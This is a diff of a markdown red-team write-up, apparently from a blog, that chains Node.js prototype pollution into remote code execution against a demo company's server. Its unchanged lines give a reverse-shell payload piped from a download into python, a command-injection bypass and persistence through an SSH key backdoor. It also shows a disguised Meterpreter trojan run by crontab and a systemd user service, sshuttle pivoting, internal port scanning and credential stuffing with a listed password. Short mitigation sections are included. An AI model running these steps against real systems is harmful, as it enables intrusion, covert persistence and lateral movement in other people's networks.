@@ -220,7 +220,7 @@ Prototype pollution is a type of deserialization vulnerability that affects Java
 The poisoning remains until the application is restarted, and can affect all components of the application, which could lead to a possible Denial of Service, which is why it is really dangerous if gone wrong.
 
 For example:
-```
+```javascript
 const a = {}
 // Polluted the prototype, added a sayHello function
 a.__proto__.sayHello = function() { console.log("Hi") }
@@ -242,7 +242,7 @@ A gadget provides a means of turning the prototype pollution vulnerability into 
 
 ## What is the vulnerable code in the current context?
 
-```
+```javascript
 exports.updateProfile = (req, res) => {
   const profile = JSON.parse(fs.readFileSync("./data.json"))
   fs.writeFileSync("./data.json", JSON.stringify(merge(profile, req.body)))
@@ -259,10 +259,11 @@ The merge function is creating an object `{}`, and then unsafely merging the pro
 There are many libraries in the npm repository that contain prototype pollution vulnerabilities, always keep in mind the supply chain. Here is an example blog post describing the issue (https://medium.com/intrinsic-blog/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96).
 
 If you make a `for each` on the source object, and then assign everything that was iterated on it, you will pollute the object.
+
 ## What is the gadget in the current context?
 The combined gadget that leads to Remote Code Execution is `execSync` function from `/refresh/badge` endpoint.
 
-```
+```javascript
 const ffmpegProcess = execSync('ffmpeg ' + ffmpegArgs.join(" "));
 ```
 
@@ -270,8 +271,9 @@ The `execSync` function exported from `child_process` node library can be used t
 
 ## Do we really need that gadget for the vulnerability to lead to Remote Code Execution?
 
-Well, yes and no. The more libraries you have, the worse. You can actually find a gadget in `node_modules`, and it will be executed sometime in the application flow as the pollution is persistent between requests, and if it does not, you can force a `require` (credits: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce):
-```
+Yes, and no. The more libraries you have, the worse. You can actually find a gadget in `node_modules`, and it will be executed sometime in the application flow as the pollution is persistent between requests, and if it does not, you can force a `require` (credits: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce):
+
+```bash
 // finding gadgets
 find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
 
@@ -328,7 +330,7 @@ res = client.put(
 
 After sending the request to the update endpoint, we will execute a GET against `refreshBadge` endpoint. Let's add a `console.log` in `refreshBadge` function.
 
-```
+```javascript
 console.log({}.__proto__, {}.pollution, {}.hello)
 ```
 
@@ -343,7 +345,7 @@ print(res, res.text)
 ```
 
 Let's check for the results.
-```
+```javascript
 [Object: null prototype] {
   pollution: 'exists',
   hello: 'from pollution'
@@ -385,9 +387,11 @@ test
 ```
 
 Let's create a real payload now.
-```
+
+```bash
 (curl http://localhost:8000/reverse_shell.py | python3) &
 ```
+
 The above payload will download the reverse shell from our machine and pipe it into the python interpreter, executing the payload in memory.
 
 ## Exploitation
@@ -447,12 +451,15 @@ Unfortunately, we can not use this critical exploit, despite potential bad guys 
 ## How can I prevent prototype pollution?
 
 ### Sanitize
+
 One approach to mitigate prototype pollution vulnerabilities involves sanitizing property keys before merging them into existing objects. This precautionary measure helps to stop attackers from injecting keys like "**proto**," which can manipulate the object's prototype.
 
 While the ideal method is to employ an **allowlist** of approved keys, it may not always be practical. In such cases, a commonly used alternative is to employ a **denylist** strategy, where potentially harmful strings from user input are removed.
 
 However, it's important to note that relying solely on blocklisting has limitations. Some websites may successfully block "**proto**" but still overlook vulnerabilities that arise when an attacker manipulates an object's prototype through its constructor. Additionally, weak blocklisting implementations can be circumvented using straightforward obfuscation techniques such as `__pro__proto__to__`. The sanitization removes `__proto__` from `__pro__proto__to__`, and leaves the output as `__proto__`. For this reason, **blacklisting is recommended as a temporary measure rather than a long-term solution**.
+
 ### Safeguard prototype objects
+
 A more resilient strategy for mitigating prototype pollution vulnerabilities involves safeguarding prototype objects against any alterations.
 
 By employing the Object.freeze() method on an object, you effectively lock down its properties and values, rendering them immutable and preventing the addition of new properties. Since prototypes are essentially objects, you can proactively safeguard against potential vulnerabilities like so:
@@ -460,7 +467,9 @@ By employing the Object.freeze() method on an object, you effectively lock down 
 `Object.freeze(Object.prototype);`
 
 Alternatively, you can consider using the Object.seal() method, which allows changes to existing property values while still restricting the addition of new properties. This approach can serve as a viable compromise when using Object.freeze() is not feasible for certain reasons.
+
 ### Eliminate gadgets
+
 In addition to using Object.freeze() to mitigate potential prototype pollution sources, you can also implement measures to neutralize potential gadgets. By doing so, even if an attacker identifies a prototype pollution vulnerability, it is likely to be rendered non-exploitable.
 
 By default, all objects inherit from the global Object.prototype, either directly or indirectly through the prototype chain. However, you have the option to manually set an object's prototype using the Object.create() method. This not only enables you to designate any object as the new object's prototype but also allows you to create the object with a null prototype. This null prototype ensures that the object won't inherit any properties whatsoever:
@@ -493,7 +502,7 @@ Command injection? Wasn't that sanitized? Yes, but the developer employed a bloc
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/2-2.png)
 
 While it would stop a payload such like this:
-```
+```bash
 '"; curl http://localhost:8000/reverse_shell.py | python3 #
 ```
 
@@ -576,6 +585,7 @@ console.log(sanitizedInput); // "HelloWorld123"
 ```
 
 Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.
+
 ## Back to the story, let's run the exploit against the target server and continue.
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/1-6.png)
@@ -590,13 +600,15 @@ After running the exploit, we've compromised the first machine. This machine is 
 Our next step is to create a rogue SSH key for persistence.
 
 ## Persistence via backdoored SSH service
-```
+
+```bash
 ssh-keygen
 ```
+
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/2-4.png)
 
 After creating the key, we should add the public part of the key into `authorized_keys`  file and copy the private part into our machine.
-```
+```bash
 cat id_rsa.pub >> authorized_keys
 cat id_rsa
 ```
@@ -605,7 +617,7 @@ cat id_rsa
 
 Now it is time to log into the SSH service, delete the created keys, and kill the reverse shell. It is important to kill the reverse shell only after we've established another control channel.
 
-```
+```bash
 ssh -i <user>@<ip>
 rm .ssh/id_rsa .ssh/id_rsa.pub
 ```
@@ -616,7 +628,7 @@ rm .ssh/id_rsa .ssh/id_rsa.pub
 
 Additionally to backdooring the SSH service, let's create a Meterpreter payload and upload it into the machine. The payload should be named in a way so it is innocent looking.
 
-```
+```bash
 msfvenom -a 64 -p <payload> -f <binary type> LPORT=<port> -o <name>
 scp -i <key> <file> <user>@<ip>:
 ```
@@ -626,7 +638,7 @@ scp -i <key> <file> <user>@<ip>:
 ## Crontab
 
 Moving forward, we'll create the .config/.node directory, copy the executable into there and change the permissions to make it executable.
-```
+```bash
 mkdir ./.config/.node
 mv node-builder ./.config/.node/
 cd ./.config/.node
@@ -635,7 +647,7 @@ chmod 755 node-builder
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/6-1.png)
 
 After uploading the backdoor, our next step is to create a crontab entry to run it each 8 hours.
-```
+```bash
 crontab -e
 0 8 * * * /home/node-api/.config/.node/node-builder
 ```
@@ -645,7 +657,7 @@ crontab -e
 
 Let's add another way of executing the trojan - create a user service. On Linux running systemd, we can create a directory '.config/systemd/user', save services in there, and then enable them.
 
-```
+```bash
 mkdir systemd
 cd systemd
 mkdir user
@@ -670,7 +682,7 @@ systemctl --user start node-build
 
 By starting the service we've executed the Meterpreter and set up a listener to connect to. We can now connect to the backdoor and test if it works.
 
-```
+```bash
 msfconsole
 use multi/handler
 set payload linux/x64/meterpreter/bind_tcp
@@ -701,7 +713,7 @@ ip route
 
 As we can see, there is 10.10.24.0/24 network available. Let's continue with pivoting into the network using `sshuttle`. SSHuttle (https://github.com/sshuttle/sshuttle) is a transparent proxy utility that forwards the multiplexed packets in a data-over-TCP pattern into the internal network over SSH tunnel transport, and routes packets through defined CIDR using `iptables` firewall , it is seamless, and there is no need for `proxychains`.
 
-```
+``` bash
 sshuttle -r user@ip <network CIDR> --ssh-cmd "ssh -i <key>" -v
 ```
 
@@ -711,7 +723,7 @@ sshuttle -r user@ip <network CIDR> --ssh-cmd "ssh -i <key>" -v
 
 After establishing the pivot, our next step is to upload a port scanner onto the mail server and scan the network. This way it is faster than sending the packets through the pivot box.
 
-```
+``` python
 meterpreter > upload src dst
 ```
 
@@ -719,7 +731,7 @@ meterpreter > upload src dst
 
 For port scanning I decided to go with a compiled NimScan (https://github.com/elddy/NimScan) binary. The ports defined are ports specific for a Windows operating system.
 
-```
+``` bash
 ./scan 10.10.24.0/24 -p:445,139,135,3389,5357,389,636
 ```
 
@@ -770,7 +782,7 @@ p.richardson@democorp.com
 
 The users scraped from website do in fact exist on the domain. The next step is to check for possible **credential stuffing** using the asset we gathered in the beginning - valid mailbox credentials, specifically for the `j.arnold` user and his `F4ll2023!` password, and pass it on to SMB authentication against all of the machines gathered from port scan. (https://attack.mitre.org/techniques/T1078/)
 
-```
+``` bash
 └─$ cat hosts.txt
 10.10.24.100
 10.10.24.101
